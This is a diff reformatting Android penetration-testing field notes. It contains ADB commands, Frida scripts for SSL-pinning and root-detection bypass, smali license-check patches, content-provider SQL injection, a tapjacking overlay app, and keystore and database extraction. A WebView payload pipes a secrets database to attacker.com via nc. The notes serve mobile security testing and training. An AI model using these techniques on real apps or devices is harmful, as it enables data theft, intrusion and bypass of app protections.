@@ -1,25 +1,30 @@
-# Android Penetration Testing Notes
+# 📱 Android Penetration Testing Notes
 
-Target Audience: Senior Security Engineers, Red Teamers, Advanced Mobile Penetration Testers
-Philosophy: Exploitation-first. Theory is assumed. Commands are king.
+> **Target Audience:** Senior Security Engineers, Red Teamers, Advanced Mobile Penetration Testers  
+> **Philosophy:** Exploitation-first. Theory is assumed. Commands are king.
 
+---
 
-📑 Table of Contents
+## 📑 Table of Contents
 
-Android Architecture Deep Dive
-Testing Environment Setup
-ADB Red Teaming
-Static Analysis - Reverse Engineering
-Dynamic Analysis - Runtime Manipulation
-Network Interception & MiTM
-Exploitation Techniques
-Root Detection & SSL Pinning Bypass
-Data Extraction & Exfiltration
-Master Cheatsheet
+1. [Android Architecture Deep Dive](#android-architecture-deep-dive)
+2. [Testing Environment Setup](#testing-environment-setup)
+3. [ADB Red Teaming](#adb-red-teaming)
+4. [Static Analysis - Reverse Engineering](#static-analysis---reverse-engineering)
+5. [Dynamic Analysis - Runtime Manipulation](#dynamic-analysis---runtime-manipulation)
+6. [Network Interception & MiTM](#network-interception--mitm)
+7. [Exploitation Techniques](#exploitation-techniques)
+8. [Root Detection & SSL Pinning Bypass](#root-detection--ssl-pinning-bypass)
+9. [Data Extraction & Exfiltration](#data-extraction--exfiltration)
+10. [Master Cheatsheet](#master-cheatsheet)
 
+---
 
-🏗️ Android Architecture Deep Dive
-The Attack Surface
+## 🏗️ Android Architecture Deep Dive
+
+### The Attack Surface
+
+```
 ┌─────────────────────────────────────┐
 │    Application Layer (APKs)         │ ← Our Primary Target
 ├─────────────────────────────────────┤
@@ -31,30 +36,40 @@ The Attack Surface
 ├─────────────────────────────────────┤
 │    Linux Kernel                     │ ← Drivers, SELinux
 └─────────────────────────────────────┘
-Critical Security Components
-Application Sandbox
+```
 
-Each app runs with unique Linux UID
-Process isolation via separate VMs
-File permissions: 0600 (owner RW only)
-Exploit Angle: Shared UID exploitation (sharedUserId in manifest)
+### Critical Security Components
 
-SELinux (Enforcing)
-bash# Check SELinux status
+#### **Application Sandbox**
+- Each app runs with unique Linux UID
+- Process isolation via separate VMs
+- File permissions: `0600` (owner RW only)
+- **Exploit Angle:** Shared UID exploitation (`sharedUserId` in manifest)
+
+#### **SELinux (Enforcing)**
+```bash
+# Check SELinux status
 adb shell getenforce
 
 # Common bypass: Check for permissive domains
 adb shell "su -c 'sesearch --allow -s untrusted_app'"
-Verified Boot
+```
 
-Cryptographic chain from bootloader → kernel → system
-Red Team Note: On rooted devices, disable dm-verity:
+#### **Verified Boot**
+- Cryptographic chain from bootloader → kernel → system
+- **Red Team Note:** On rooted devices, disable dm-verity:
+```bash
+adb root && adb disable-verity && adb reboot
+```
 
-bashadb root && adb disable-verity && adb reboot
+---
 
-🔧 Testing Environment Setup
-Essential Toolkit
-bash# Core Tools Installation (Kali/Parrot)
+## 🔧 Testing Environment Setup
+
+### Essential Toolkit
+
+```bash
+# Core Tools Installation (Kali/Parrot)
 apt install -y android-tools-adb android-tools-fastboot
 pip3 install frida-tools objection apkleaks
 
@@ -65,9 +80,13 @@ wget https://github.com/skylot/jadx/releases/latest/download/jadx-*.zip && unzip
 # Mobile Security Framework (MobSF)
 docker pull opensecurity/mobile-security-framework-mobsf
 docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
-Emulator for Pentest
-Genymotion with ARM Translation (Recommended for production apps):
-bash# Install ARM translation for running real-world apps
+```
+
+### Emulator for Pentest
+
+**Genymotion with ARM Translation** (Recommended for production apps):
+```bash
+# Install ARM translation for running real-world apps
 # Download ARM Translation zip from: https://github.com/m9rco/Genymotion_ARM_Translation
 adb push Genymotion-ARM-Translation.zip /sdcard/
 adb shell
@@ -75,17 +94,26 @@ su
 cd /sdcard
 unzip Genymotion-ARM-Translation.zip -d /system
 reboot
-Android Studio AVD with Root:
-bash# Use AVD without Google Play (important for root)
+```
+
+**Android Studio AVD with Root**:
+```bash
+# Use AVD without Google Play (important for root)
 emulator -avd Pixel_3a_API_30 -writable-system
 
 # Root the emulator
 adb root
 adb remount
+```
 
-💀 ADB Red Teaming
-Port Forwarding & Reverse Shells
-bash# Forward JDWP debugging port (for app debugging without USB)
+---
+
+## 💀 ADB Red Teaming
+
+### Port Forwarding & Reverse Shells
+
+```bash
+# Forward JDWP debugging port (for app debugging without USB)
 adb forward tcp:8700 jdwp:$(adb shell pidof -s com.target.app)
 
 # Reverse shell via ADB (requires root)
@@ -94,8 +122,12 @@ nc <device_ip> 4444
 
 # Port forward for Frida
 adb forward tcp:27042 tcp:27042
-Data Exfiltration via ADB
-bash# Pull entire app data directory (root required)
+```
+
+### Data Exfiltration via ADB
+
+```bash
+# Pull entire app data directory (root required)
 adb shell "su -c 'tar -czf /sdcard/app_data.tar.gz /data/data/com.target.app'"
 adb pull /sdcard/app_data.tar.gz
 
@@ -111,8 +143,12 @@ adb pull /sdcard/screen.png
 adb shell screenrecord /sdcard/demo.mp4
 # Press Ctrl+C to stop, then pull
 adb pull /sdcard/demo.mp4
-Process Injection via JDWP
-bash# Find debuggable apps
+```
+
+### Process Injection via JDWP
+
+```bash
+# Find debuggable apps
 adb shell "ps | grep 'u0_a' | awk '{print \$9}'"
 
 # Get JDWP port for target process
@@ -126,8 +162,12 @@ jdb -attach localhost:8700
 > threads
 > suspend
 # (Inject malicious code here via reflection)
-Logcat Weaponization
-bash# Filter for passwords/tokens (common dev mistake)
+```
+
+### Logcat Weaponization
+
+```bash
+# Filter for passwords/tokens (common dev mistake)
 adb logcat | grep -iE "password|token|secret|api_key|bearer"
 
 # Monitor crypto operations
@@ -139,10 +179,16 @@ adb logcat | grep -iE "root|supersu|magisk|xposed"
 # Export filtered logs
 adb logcat -d *:E > error_logs.txt  # Errors only
 adb logcat -d | grep -i "sqlitedb" > db_operations.txt
+```
 
-🔬 Static Analysis - Reverse Engineering
-APK Extraction & Decompilation
-bash# Extract APK from device
+---
+
+## 🔬 Static Analysis - Reverse Engineering
+
+### APK Extraction & Decompilation
+
+```bash
+# Extract APK from device
 adb shell pm list packages -f | grep <keyword>
 adb pull /data/app/com.target.app-XXXX/base.apk target.apk
 
@@ -151,10 +197,15 @@ apktool d target.apk -o decompiled/
 
 # Decompile to Java with JADX
 jadx -d output/ target.apk
-Smali Patching for Exploitation
-Example: Bypass License Check
-Original Smali (LicenseValidator.smali):
-smali.method public checkLicense()Z
+```
+
+### Smali Patching for Exploitation
+
+**Example: Bypass License Check**
+
+Original Smali (`LicenseValidator.smali`):
+```smali
+.method public checkLicense()Z
     .locals 2
     
     invoke-static {}, Lcom/target/LicenseValidator;->verifyServer()Z
@@ -168,15 +219,21 @@ smali.method public checkLicense()Z
     const/4 v1, 0x0
     return v1
 .end method
+```
+
 Patched Smali (always return true):
-smali.method public checkLicense()Z
+```smali
+.method public checkLicense()Z
     .locals 1
     
     const/4 v0, 0x1  # Force return true
     return v0
 .end method
-Recompile & Sign:
-bash# Rebuild APK
+```
+
+**Recompile & Sign**:
+```bash
+# Rebuild APK
 apktool b decompiled/ -o modified.apk
 
 # Sign with debug key
@@ -188,8 +245,12 @@ zipalign -v 4 modified.apk aligned.apk
 
 # Install
 adb install -r aligned.apk
-Native Library (JNI) Analysis
-bash# Extract .so files
+```
+
+### Native Library (JNI) Analysis
+
+```bash
+# Extract .so files
 unzip target.apk "lib/*" -d native_libs/
 
 # Identify architecture
@@ -200,8 +261,11 @@ file native_libs/lib/armeabi-v7a/libnative.so
 
 # Strings extraction (quick intel)
 strings native_libs/lib/arm64-v8a/libnative.so | grep -iE "http|key|password"
-Frida Hook for JNI Function:
-javascript// Hook native function via JNI
+```
+
+**Frida Hook for JNI Function**:
+```javascript
+// Hook native function via JNI
 Java.perform(function() {
     var nativeLib = Process.getModuleByName("libnative.so");
     var nativeFunc = nativeLib.getExportByName("Java_com_target_Native_decrypt");
@@ -217,8 +281,12 @@ Java.perform(function() {
         }
     });
 });
-AndroidManifest.xml Exploitation Recon
-bash# Extract manifest
+```
+
+### AndroidManifest.xml Exploitation Recon
+
+```bash
+# Extract manifest
 aapt dump xmltree target.apk AndroidManifest.xml
 
 # Key attack vectors to check:
@@ -233,11 +301,17 @@ grep "android:allowBackup=\"true\"" AndroidManifest.xml
 
 # 4. Clear text traffic (no SSL enforcement)
 grep "android:usesCleartextTraffic=\"true\"" AndroidManifest.xml
+```
 
-⚡ Dynamic Analysis - Runtime Manipulation
-Frida Framework Mastery
-Installation:
-bash# Install Frida on host
+---
+
+## ⚡ Dynamic Analysis - Runtime Manipulation
+
+### Frida Framework Mastery
+
+**Installation**:
+```bash
+# Install Frida on host
 pip3 install frida-tools
 
 # Download Frida server for Android
@@ -248,9 +322,13 @@ unxz frida-server-16.0.10-android-arm64.xz
 adb push frida-server-16.0.10-android-arm64 /data/local/tmp/frida-server
 adb shell "chmod 755 /data/local/tmp/frida-server"
 adb shell "/data/local/tmp/frida-server &"
-Advanced Frida Scripts
-1. SSL Pinning Bypass (Universal)
-javascriptJava.perform(function() {
+```
+
+**Advanced Frida Scripts**
+
+**1. SSL Pinning Bypass (Universal)**
+```javascript
+Java.perform(function() {
     // Hook OkHttp3
     var CertificatePinner = Java.use("okhttp3.CertificatePinner");
     CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
@@ -270,8 +348,11 @@ javascriptJava.perform(function() {
         console.log("[+] SSLContext.init bypassed");
     };
 });
-2. Root Detection Bypass
-javascriptJava.perform(function() {
+```
+
+**2. Root Detection Bypass**
+```javascript
+Java.perform(function() {
     // Magisk detection
     var File = Java.use("java.io.File");
     File.exists.implementation = function() {
@@ -299,8 +380,11 @@ javascriptJava.perform(function() {
     var Build = Java.use("android.os.Build");
     Build.TAGS.value = "release-keys";
 });
-3. Method Tracer (for Reverse Engineering Logic)
-javascriptJava.perform(function() {
+```
+
+**3. Method Tracer (for Reverse Engineering Logic)**
+```javascript
+Java.perform(function() {
     var targetClass = Java.use("com.target.app.CryptoManager");
     
     targetClass.class.getDeclaredMethods().forEach(function(method) {
@@ -318,8 +402,11 @@ javascriptJava.perform(function() {
         }
     });
 });
-4. Shared Preferences Dumper
-javascriptJava.perform(function() {
+```
+
+**4. Shared Preferences Dumper**
+```javascript
+Java.perform(function() {
     var SharedPrefs = Java.use("android.app.SharedPreferencesImpl");
     SharedPrefs.getString.implementation = function(key, defValue) {
         var value = this.getString(key, defValue);
@@ -327,8 +414,11 @@ javascriptJava.perform(function() {
         return value;
     };
 });
-Running Frida Scripts:
-bash# Attach to running app
+```
+
+**Running Frida Scripts**:
+```bash
+# Attach to running app
 frida -U -f com.target.app -l script.js --no-pause
 
 # Spawn app with script
@@ -336,9 +426,13 @@ frida -U -n "Target App" -l script.js
 
 # Use Objection (Frida wrapper)
 objection -g com.target.app explore
-Drozer Framework
-Setup:
-bash# Install Drozer agent APK on device
+```
+
+### Drozer Framework
+
+**Setup**:
+```bash
+# Install Drozer agent APK on device
 adb install drozer-agent.apk
 
 # Forward port
@@ -346,8 +440,12 @@ adb forward tcp:31415 tcp:31415
 
 # Start Drozer console
 drozer console connect
-Exploitation Commands:
-bash# Enumerate attack surface
+```
+
+**Exploitation Commands**:
+
+```bash
+# Enumerate attack surface
 run app.package.attacksurface com.target.app
 
 # Find exported activities
@@ -367,11 +465,18 @@ run app.provider.query content://com.target.app.provider/users
 
 # Broadcast Intent sniffing
 run app.broadcast.sniff --action android.intent.action.BOOT_COMPLETED
+```
 
-🌐 Network Interception & MiTM
-Burp Suite Configuration
-1. Certificate Installation (Android 7+)
-bash# Export Burp CA cert
+---
+
+## 🌐 Network Interception & MiTM
+
+### Burp Suite Configuration
+
+**1. Certificate Installation (Android 7+)**
+
+```bash
+# Export Burp CA cert
 # In Burp: Proxy > Options > Import/Export CA Certificate > Certificate in DER format
 
 # Convert to PEM and rename
@@ -386,26 +491,41 @@ adb root && adb remount
 adb push 9a5ba575.0 /system/etc/security/cacerts/
 adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0
 adb reboot
-2. Proxy Setup
-bash# Configure device WiFi
+```
+
+**2. Proxy Setup**
+
+```bash
+# Configure device WiFi
 # Manual proxy: <Host_IP>:8080
 
 # Or use ProxyDroid app for global proxy (root required)
 
 # Verify traffic
 # Burp > Proxy > Intercept > Enable
-3. Bypassing Certificate Pinning with Frida (if not patched)
-bash# Use pre-built script
+```
+
+**3. Bypassing Certificate Pinning with Frida (if not patched)**
+
+```bash
+# Use pre-built script
 frida -U -f com.target.app -l fridascripts/universal-ssl-pinning-bypass.js --no-pause
-mitmproxy for Scriptable Interception
-bash# Install
+```
+
+### mitmproxy for Scriptable Interception
+
+```bash
+# Install
 pip3 install mitmproxy
 
 # Start with addon script
 mitmproxy -s modify_response.py
 
 # Example addon (modify_response.py)
-pythonfrom mitmproxy import http
+```
+
+```python
+from mitmproxy import http
 
 def response(flow: http.HTTPFlow) -> None:
     if "api.target.com" in flow.request.pretty_host:
@@ -414,24 +534,35 @@ def response(flow: http.HTTPFlow) -> None:
             data = flow.response.json()
             data["isPremium"] = True  # Grant premium access
             flow.response.text = json.dumps(data)
+```
 
-🎯 Exploitation Techniques
-1. Content Provider Exploitation
-Identify Vulnerable Providers:
-bash# Drozer scan
+---
+
+## 🎯 Exploitation Techniques
+
+### 1. Content Provider Exploitation
+
+**Identify Vulnerable Providers**:
+```bash
+# Drozer scan
 run scanner.provider.finduris -a com.target.app
 
 # Manual check in manifest
 grep -A 5 "<provider" AndroidManifest.xml
-SQL Injection PoC:
-bash# Drozer
+```
+
+**SQL Injection PoC**:
+```bash
+# Drozer
 run app.provider.query content://com.target.app.provider/users --projection "* FROM sqlite_master WHERE type='table'--"
 
 # ADB
 adb shell content query --uri content://com.target.app.provider/users --projection "*) FROM users WHERE 1=1--"
 
 # Frida (programmatic)
-javascriptJava.perform(function() {
+```
+```javascript
+Java.perform(function() {
     var Uri = Java.use("android.net.Uri");
     var ContentResolver = Java.use("android.content.ContentResolver");
     
@@ -444,13 +575,19 @@ javascriptJava.perform(function() {
         console.log(cursor.getString(0) + ":" + cursor.getString(1));
     }
 });
-2. Insecure Broadcast Receivers
-Exploit Unprotected Receiver:
-bash# Send malicious broadcast
+```
+
+### 2. Insecure Broadcast Receivers
+
+**Exploit Unprotected Receiver**:
+```bash
+# Send malicious broadcast
 adb shell am broadcast -a com.target.app.ACTION_PREMIUM -n com.target.app/.PremiumReceiver --es "unlock" "true"
 
 # Frida script
-javascriptJava.perform(function() {
+```
+```javascript
+Java.perform(function() {
     var Intent = Java.use("android.content.Intent");
     var ActivityThread = Java.use("android.app.ActivityThread");
     
@@ -460,13 +597,20 @@ javascriptJava.perform(function() {
     ActivityThread.currentApplication().sendBroadcast(intent);
     console.log("[+] Malicious broadcast sent");
 });
-3. Tapjacking Attack
-Malicious Overlay App (PoC):
-xml<!-- AndroidManifest.xml -->
+```
+
+### 3. Tapjacking Attack
+
+**Malicious Overlay App (PoC)**:
+```xml
+<!-- AndroidManifest.xml -->
 <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
 
 <service android:name=".OverlayService" android:exported="false"/>
-java// OverlayService.java
+```
+
+```java
+// OverlayService.java
 public class OverlayService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -492,15 +636,25 @@ public class OverlayService extends Service {
         return START_STICKY;
     }
 }
-Defense Check:
-java// Victim app should use
+```
+
+**Defense Check**:
+```java
+// Victim app should use
 view.setFilterTouchesWhenObscured(true);
-4. WebView Exploitation
-Check for Vulnerable WebView:
-bashgrep -r "setJavaScriptEnabled(true)" decompiled/
+```
+
+### 4. WebView Exploitation
+
+**Check for Vulnerable WebView**:
+```bash
+grep -r "setJavaScriptEnabled(true)" decompiled/
 grep -r "addJavascriptInterface" decompiled/
-XSS to RCE via JavaScript Bridge:
-javascript// If app exposes Java object to JS
+```
+
+**XSS to RCE via JavaScript Bridge**:
+```javascript
+// If app exposes Java object to JS
 webView.addJavascriptInterface(new JavaScriptInterface(), "Android");
 
 // Exploitation payload
@@ -510,23 +664,32 @@ webView.addJavascriptInterface(new JavaScriptInterface(), "Android");
     .invoke(null,null)
     .exec(['sh','-c','cat /data/data/com.target.app/databases/secrets.db | nc attacker.com 4444']);
 </script>
+```
 
-🛡️ Root Detection & SSL Pinning Bypass
-Root Detection Methods & Bypasses
-Common Checks:
+---
 
-File existence: /system/app/Superuser.apk, /system/xbin/su
-Build tags: test-keys vs release-keys
-Running processes: ps | grep magisk
-Package manager: pm list packages | grep supersu
+## 🛡️ Root Detection & SSL Pinning Bypass
 
-Universal Bypass with Magisk Hide:
-bash# Enable MagiskHide for target app
+### Root Detection Methods & Bypasses
+
+**Common Checks**:
+1. **File existence**: `/system/app/Superuser.apk`, `/system/xbin/su`
+2. **Build tags**: `test-keys` vs `release-keys`
+3. **Running processes**: `ps | grep magisk`
+4. **Package manager**: `pm list packages | grep supersu`
+
+**Universal Bypass with Magisk Hide**:
+```bash
+# Enable MagiskHide for target app
 adb shell su -c 'magiskhide enable'
 adb shell su -c 'magiskhide add com.target.app'
-Frida Script (see Dynamic Analysis section)
-Manual Smali Patch:
-smali# Find root check method
+```
+
+**Frida Script (see Dynamic Analysis section)**
+
+**Manual Smali Patch**:
+```smali
+# Find root check method
 .method public isRooted()Z
     # ... checks ...
     const/4 v0, 0x1  # Returns true if rooted
@@ -538,26 +701,39 @@ smali# Find root check method
     const/4 v0, 0x0
     return v0
 .end method
-SSL Pinning Bypass
-1. Using Magisk Module:
-bash# Install TrustMeAlready module
+```
+
+### SSL Pinning Bypass
+
+**1. Using Magisk Module**:
+```bash
+# Install TrustMeAlready module
 # Download from: https://github.com/ViRb3/TrustMeAlready/releases
 adb push TrustMeAlready.zip /sdcard/
 # Flash via Magisk Manager
-2. Objection (Automated):
-bashobjection -g com.target.app explore
+```
+
+**2. Objection (Automated)**:
+```bash
+objection -g com.target.app explore
 android sslpinning disable
-3. Manual Frida (see Network Interception section)
-4. Xposed Module:
+```
 
-Install JustTrustMe or SSLUnpinning module
-Enable for target app
-Reboot
+**3. Manual Frida (see Network Interception section)**
 
+**4. Xposed Module**:
+- Install JustTrustMe or SSLUnpinning module
+- Enable for target app
+- Reboot
 
-💾 Data Extraction & Exfiltration
-Database Extraction
-bash# Root method
+---
+
+## 💾 Data Extraction & Exfiltration
+
+### Database Extraction
+
+```bash
+# Root method
 adb shell "su -c 'cp -r /data/data/com.target.app/databases /sdcard/'"
 adb pull /sdcard/databases
 
@@ -571,12 +747,18 @@ sqlite3 user_data.db
 .tables
 .schema users
 SELECT * FROM users WHERE role='admin';
-Shared Preferences Extraction
-bash# Root method
+```
+
+### Shared Preferences Extraction
+
+```bash
+# Root method
 adb shell "su -c 'cat /data/data/com.target.app/shared_prefs/*.xml'"
 
 # Frida dumper
-javascriptJava.perform(function() {
+```
+```javascript
+Java.perform(function() {
     var ctx = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
     var prefs = ctx.getSharedPreferences("user_prefs", 0);
     var allEntries = prefs.getAll();
@@ -589,16 +771,24 @@ javascriptJava.perform(function() {
         console.log(entry.getKey() + " = " + entry.getValue());
     }
 });
-Keychain/Keystore Extraction
-bash# Dump keystore (root required)
+```
+
+### Keychain/Keystore Extraction
+
+```bash
+# Dump keystore (root required)
 adb shell "su -c 'cat /data/misc/keystore/user_0/*' | base64" | base64 -d > keystore.bin
 
 # Use keychain_dumper
 adb push keychain_dumper /data/local/tmp/
 adb shell "su -c 'chmod 755 /data/local/tmp/keychain_dumper'"
 adb shell "su -c '/data/local/tmp/keychain_dumper'"
-Screenshot & Screen Recording
-bash# Automated screenshot loop
+```
+
+### Screenshot & Screen Recording
+
+```bash
+# Automated screenshot loop
 while true; do
   adb shell screencap -p /sdcard/screen_$(date +%s).png
   sleep 5
@@ -608,7 +798,9 @@ done
 adb pull /sdcard/screen_*.png screenshots/
 
 # Screen recording with Frida (programmatic)
-javascriptJava.perform(function() {
+```
+```javascript
+Java.perform(function() {
     var MediaRecorder = Java.use("android.media.MediaRecorder");
     var File = Java.use("java.io.File");
     
@@ -622,11 +814,17 @@ javascriptJava.perform(function() {
     
     console.log("[+] Recording started");
 });
+```
 
-📋 Master Cheatsheet
-Quick Reference Commands
-ADB Essentials
-bash# Device connection
+---
+
+## 📋 Master Cheatsheet
+
+### Quick Reference Commands
+
+#### ADB Essentials
+```bash
+# Device connection
 adb devices
 adb connect <IP>:5555
 adb -s <device_id> shell
@@ -650,8 +848,11 @@ adb shell cat /proc/<PID>/maps
 # Port forwarding
 adb forward tcp:<local_port> tcp:<remote_port>
 adb reverse tcp:<remote_port> tcp:<local_port>
-APK Analysis
-bash# Decompile
+```
+
+#### APK Analysis
+```bash
+# Decompile
 apktool d app.apk -o output/
 jadx -d output/ app.apk
 
@@ -667,8 +868,11 @@ aapt dump xmltree app.apk AndroidManifest.xml
 
 # Strings extraction
 strings classes.dex | grep -iE "http|api|key|password"
-Frida One-Liners
-bash# List processes
+```
+
+#### Frida One-Liners
+```bash
+# List processes
 frida-ps -U
 
 # Spawn with script
@@ -687,8 +891,11 @@ objection -g <package> explore
 > android intent launch_activity <activity>
 > android sslpinning disable
 > memory dump all <output_file>
-Drozer Exploitation
-bash# Attack surface
+```
+
+#### Drozer Exploitation
+```bash
+# Attack surface
 run app.package.attacksurface <package>
 
 # Activities
@@ -708,8 +915,11 @@ run scanner.provider.traversal -a <package>
 # Broadcast Receivers
 run app.broadcast.info -a <package>
 run app.broadcast.send --action <action> --extra string <key> <value>
-Cryptography Analysis
-bash# Check crypto implementation
+```
+
+#### Cryptography Analysis
+```bash
+# Check crypto implementation
 grep -r "Cipher\.getInstance" decompiled/
 grep -r "MessageDigest" decompiled/
 grep -r "SecureRandom" decompiled/
@@ -718,8 +928,11 @@ grep -r "SecureRandom" decompiled/
 grep -r "AES/ECB" decompiled/  # Bad: No IV
 grep -r "DES" decompiled/       # Bad: Weak algo
 grep -r "MD5\|SHA1" decompiled/ # Bad: For passwords
-Network Interception
-bash# Burp certificate
+```
+
+#### Network Interception
+```bash
+# Burp certificate
 openssl x509 -inform DER -in burp.der -out burp.pem
 subject_hash=$(openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -1)
 cat burp.pem > ${subject_hash}.0
@@ -734,17 +947,24 @@ tcpdump -i any -w capture.pcap
 adb shell "tcpdump -s0 -w - | nc -l -p 4444" &
 adb forward tcp:4444 tcp:4444
 nc localhost 4444 | wireshark -k -i -
-Frida Script Snippets Library
-Hook Constructor
-javascriptJava.perform(function() {
+```
+
+### Frida Script Snippets Library
+
+#### Hook Constructor
+```javascript
+Java.perform(function() {
     var TargetClass = Java.use("com.target.ClassName");
     TargetClass.$init.implementation = function() {
         console.log("[+] Constructor called");
         return this.$init.apply(this, arguments);
     };
 });
-Intercept Method & Modify Return
-javascriptJava.perform(function() {
+```
+
+#### Intercept Method & Modify Return
+```javascript
+Java.perform(function() {
     var TargetClass = Java.use("com.target.ClassName");
     TargetClass.methodName.implementation = function(arg1) {
         console.log("[+] Called with: " + arg1);
@@ -753,8 +973,11 @@ javascriptJava.perform(function() {
         return "MODIFIED_VALUE";  // Change return value
     };
 });
-Enumerate Loaded Classes
-javascriptJava.perform(function() {
+```
+
+#### Enumerate Loaded Classes
+```javascript
+Java.perform(function() {
     Java.enumerateLoadedClasses({
         onMatch: function(className) {
             if (className.indexOf("com.target") !== -1) {
@@ -764,16 +987,22 @@ javascriptJava.perform(function() {
         onComplete: function() {}
     });
 });
-Dump Class Methods
-javascriptJava.perform(function() {
+```
+
+#### Dump Class Methods
+```javascript
+Java.perform(function() {
     var TargetClass = Java.use("com.target.ClassName");
     var methods = TargetClass.class.getDeclaredMethods();
     methods.forEach(function(method) {
         console.log(method.getName());
     });
 });
-Hook All Overloads
-javascriptJava.perform(function() {
+```
+
+#### Hook All Overloads
+```javascript
+Java.perform(function() {
     var TargetClass = Java.use("com.target.ClassName");
     var overloads = TargetClass.methodName.overloads;
     
@@ -784,21 +1013,30 @@ javascriptJava.perform(function() {
         };
     });
 });
-Call Static Method
-javascriptJava.perform(function() {
+```
+
+#### Call Static Method
+```javascript
+Java.perform(function() {
     var TargetClass = Java.use("com.target.ClassName");
     var result = TargetClass.staticMethod("arg1", "arg2");
     console.log("[+] Result: " + result);
 });
-Instantiate & Call Instance Method
-javascriptJava.perform(function() {
+```
+
+#### Instantiate & Call Instance Method
+```javascript
+Java.perform(function() {
     var TargetClass = Java.use("com.target.ClassName");
     var instance = TargetClass.$new();  // Call constructor
     var result = instance.instanceMethod("arg");
     console.log("[+] Result: " + result);
 });
-Monitor File Operations
-javascriptJava.perform(function() {
+```
+
+#### Monitor File Operations
+```javascript
+Java.perform(function() {
     var FileInputStream = Java.use("java.io.FileInputStream");
     FileInputStream.$init.overload('java.lang.String').implementation = function(path) {
         console.log("[FILE READ] " + path);
@@ -811,8 +1049,11 @@ javascriptJava.perform(function() {
         return this.$init(path);
     };
 });
-Bypass Flag Checks
-javascriptJava.perform(function() {
+```
+
+#### Bypass Flag Checks
+```javascript
+Java.perform(function() {
     var Activity = Java.use("android.app.Activity");
     Activity.isTaskRoot.implementation = function() {
         return true;  // Bypass detection of running under another task
@@ -823,32 +1064,27 @@ javascriptJava.perform(function() {
         return false;  // Hide debugger
     };
 });
+```
 
-🎓 Final Notes
-Recommended Lab Setup
+---
 
-Physical Device: Rooted Pixel 3a (Magisk + EdXposed)
-Emulator: Genymotion with ARM translation
-Host OS: Kali Linux (or Parrot Security)
-Network: Isolated lab network with controlled internet access
+## 🎓 Final Notes
 
-Continuous Learning Resources
+### Recommended Lab Setup
+1. **Physical Device**: Rooted Pixel 3a (Magisk + EdXposed)
+2. **Emulator**: Genymotion with ARM translation
+3. **Host OS**: Kali Linux (or Parrot Security)
+4. **Network**: Isolated lab network with controlled internet access
 
-OWASP MSTG: https://github.com/OWASP/owasp-mstg
-Frida CodeShare: https://codeshare.frida.re/
-Android Security Bulletin: https://source.android.com/security/bulletin
-XDA Developers: https://www.xda-developers.com/
+### Continuous Learning Resources
+- **OWASP MSTG**: https://github.com/OWASP/owasp-mstg
+- **Frida CodeShare**: https://codeshare.frida.re/
+- **Android Security Bulletin**: https://source.android.com/security/bulletin
+- **XDA Developers**: https://www.xda-developers.com/
 
-Legal & Ethical Considerations
-⚠️ WARNING: All techniques documented here are for authorized security testing only.
-
-Always obtain written permission before testing
-Respect scope boundaries
-Follow responsible disclosure practices
-Never weaponize for malicious purposes
-
-
-Document Version: 2.0 - Advanced eMAPT Field Notes
-Last Updated: Based on eMAPT PDF content
-Maintained by: Senior Mobile Security Engineering Team
-"In mobile security, the attack surface is in your pocket."
+### Legal & Ethical Considerations
+⚠️ **WARNING**: All techniques documented here are for authorized security testing only.
+- Always obtain written permission before testing
+- Respect scope boundaries
+- Follow responsible disclosure practices
+- Never weaponize for malicious purposes
